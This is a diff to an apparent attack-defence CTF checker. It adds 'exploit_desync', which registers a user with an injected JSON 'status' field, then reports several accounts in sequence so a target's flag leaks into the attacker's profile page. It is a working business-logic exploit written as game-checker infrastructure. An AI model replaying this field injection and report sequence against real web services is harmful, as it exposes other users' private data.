@@ -542,6 +542,68 @@ async def havoc(task: HavocCheckerTaskMessage, logger: LoggerAdapter, httpclient
     await client.logout()
     pass
 
+async def signup_broken(client):
+    username = generate_username()
+    password = generate_password()
+    data = {"username": username, "password": password, "firstname": "script", "lastname": "script","status":'{"num_reports":[]}', "accounttype": "business"}
+    res = await client.post('/session/register', data=data, follow_redirects=True)
+    await client.logout()
+    return username
+
+async def signup_useless(client):
+    username = generate_username()
+    password = generate_password()
+    await client.register(username, password,
+                          generate_random_string(8, False), generate_random_string(8, False),
+                          'enterprise')
+    await client.logout()
+    return username
+
+@checker.exploit(0)
+async def exploit_desync(task: ExploitCheckerTaskMessage, logger: LoggerAdapter, searcher: FlagSearcher,
+                                       httpclient: AsyncClient) -> bytes | None:
+    target_user = task.attack_info
+    client = JitterishClient(logger, httpclient)
+    # signup broken user
+    broken = await signup_broken(client)
+    # signup padding user
+    useless = await signup_useless(client)
+    # signup the regular user
+    username = generate_username()
+    password = generate_password()
+    await client.register(username, password, generate_random_string(8, False), generate_random_string(8, False), 'enterprise')
+    reason = generate_username()
+    # report padding user
+    await client.report(useless, reason)
+    # report broken user
+    await client.report(broken, reason)
+    # report gameserver 
+    logger.info(target_user)
+    await client.report(target_user, reason)
+    res = await client.get('/session/profile')
+    return searcher.search_flag(res.text)
+
+
+
+# def report(s, username):
+#     support_data = {"target_user": username, "description": get_random()}
+#     r = s.post("http://localhost:8000/support", data = support_data)
+#     return s
+# 
+# def get_profile(s):
+#     r = s.get("http://localhost:8000/session/profile")
+#     print(r.text)
+# 
+# # report padding user
+# s = report(s,useless)
+# # report broken user
+# s = report(s,broken)
+# # report gameserver
+# s = report(s,flag_id)
+# # visit profile
+# get_profile(s)
+
+
 if __name__ == "__main__":
     # production: gunicorn -c gunicorn.conf.py "checker:app()"
     import logging
